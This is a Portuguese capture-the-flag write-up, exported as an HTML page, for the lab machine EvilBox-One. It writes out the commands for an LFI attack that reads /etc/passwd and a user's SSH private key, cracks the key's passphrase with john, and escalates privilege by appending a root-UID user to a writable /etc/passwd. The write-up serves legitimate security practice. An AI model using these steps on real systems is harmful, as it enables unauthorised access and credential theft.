<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>EvilBox-One</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>EvilBox-One</h1><br/><br />▸ <a href="CTFs--ProvingGrounds--EvilBox-One.html">EvilBox-One</a><br />	◇ <a href="CTFs--ProvingGrounds--EvilBox-One.html#h1-1">Enumeration</a><br />	◇ <a href="CTFs--ProvingGrounds--EvilBox-One.html#h1-2">Exploitation</a><br />	◇ <a href="CTFs--ProvingGrounds--EvilBox-One.html#h1-3">Post-Exploitation</a><br />	◇ <a href="CTFs--ProvingGrounds--EvilBox-One.html#h1-4">Privilege Escalation</a><br />	<br />-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----<br />#lfi #apache2 #feroxbuster #passwd #openssl #ssh2john #john<br />-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----<br />- Localizado diretório com uma página php suspeita<br />- Feito fuzz na página e descoberto um parametro com vulnerabilidade LFI<br />- Através da vulnerabilidade foi possivel obter a chave ssh de um dos usuarios<br />- Chave esta criptografa, utilizado as ferramentas ssh2john e john para descobrir a senha<br />- Após acesso foi descoberto que possuimos permissão de escrita no arquivo /etc/passwd <br />- Criado novo usuario “eldruin” com permissão de root<br />-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----x-----<br /><h1>Enumeration</h1><a name="h1-1"></a><br /><br />	sudo masscan -p 1-65535 -i tun0 --rate=1000 192.168.115.212<br />	<img src="images/89-1.png" alt="images/89-1.png" /><br /><br />	└─$ sudo nmap -sCV -Pn -p 80,22 192.168.115.212<br />	<img src="images/89-2.png" alt="images/89-2.png" /><br /><br />	Acessando a porta 80 temos a página padrão do Apache2<br />	<img src="images/89-3.png" alt="images/89-3.png" /><br /><br />	Então vamos tentar localizar outros diretorios ou arquivos no site<br /><br />	└─$ feroxbuster -u http://192.168.115.212 -w ~/wordlists/big.txt -x php,html,txt,xml<br />	<img src="images/89-4.png" alt="images/89-4.png" /><br /><br />	Interessante, achamos um diretorio “secret” com uma página “evil.php”. Vamos acessá-la<br />	<img src="images/89-5.png" alt="images/89-5.png" /><br /><br />	Infelizmente ela não trouxe nada, vamos fazer uma busca por parametros<br />	└─$ wfuzz --hw 0 -c -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.115.212/secret/evil.php?FUZZ=/etc/passwd<br />	<img src="images/89-6.png" alt="images/89-6.png" /><br /><br /><h1>Exploitation</h1><a name="h1-2"></a><br /><br />	Perfeito, vamos ver o que este parametro retorna<br />	└─$ curl http://192.168.115.212/secret/evil.php?command=/etc/passwd<br />	<img src="images/89-7.png" alt="images/89-7.png" /><br /><br />	Ótimo, temos uma vulnerabilidade LFI. <br />	Verificando melhor o arquivo encontramos os usuario “root” e “mowree”. Vamos enumerar melhor para buscar um ponto de entrada<br />	└─$ curl http://192.168.115.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa<br />	<img src="images/89-8.png" alt="images/89-8.png" /><br /><br />	Ótimo, vamos baixar essa chave e tentar logar como o usuario mowree<br />	<img src="images/89-9.png" alt="images/89-9.png" /><br /><br />	Opa, não percebi que a chave estava encryptada. Então vamos recorrer ao bom e velho &quot;john&quot;<br />	└─$ ssh2john id_rsa &gt; enc_id_rsa<br />	└─$ john enc_id_rsa -w=/home/eldruin/wordlists/rockyou.txt <br />	<img src="images/89-10.png" alt="images/89-10.png" /><br /><br />	Ok, agora vamos tentar novamente<br />	<img src="images/89-11.png" alt="images/89-11.png" /><br /><br />	HABEMUS SHELL \o/<br /><br /><h1>Post-Exploitation</h1><a name="h1-3"></a><br /><br />	Vamos pegar a primeira flag<br />	<img src="images/89-12.png" alt="images/89-12.png" /><br /><br />	Alguns comandos básicos de enumeração não retornaram nada interessante<br />	<img src="images/89-13.png" alt="images/89-13.png" /><br /><br />	Um dos scripts de enumeração que mais gosto é o <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linpeas</a>. Vamos upar ele na máquina e executá-lo<br />	<img src="images/89-14.png" alt="images/89-14.png" /><br /><br />	<img src="images/89-15.png" alt="images/89-15.png" /><br /><br />	Um dos resultados do script é interessante<br />	<img src="images/89-16.png" alt="images/89-16.png" /><br /><br /><h1>Privilege Escalation</h1><a name="h1-4"></a><br /><br />	Então possuimos permissão de escrita no arquivo passwd, então podemos criar um novo usuario como root<br />	Geralmente eu começo copiando uma das linhas do arquivo e alterando ela<br /><br />	root:x:0:0:root:/root:/bin/bash &gt; eldruin:x:0:0:root:/root:/bin/bash<br /><br />	Porém precisamos colocar um password no lugar do “x”, para isso usamos o comando openssl<br />	└─$ openssl passwd eldruin<br />	<img src="images/89-17.png" alt="images/89-17.png" /><br /><br />	Atualizamos a linha anterior<br />	eldruin:IL7LYcCa2b9l6:0:0:root:/root:/bin/bash<br /><br />	E agora colocamos essa linha no final do arquivo<br />	echo &quot;eldruin:IL7LYcCa2b9l6:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd<br /><br />	E com isso conseguimos logar com nosso novo usuario<br />	<img src="images/89-18.png" alt="images/89-18.png" /><br /><br />	Agora é só pegar a última flag<br />	<img src="images/89-19.png" alt="images/89-19.png" /></div>
</body>
</html>
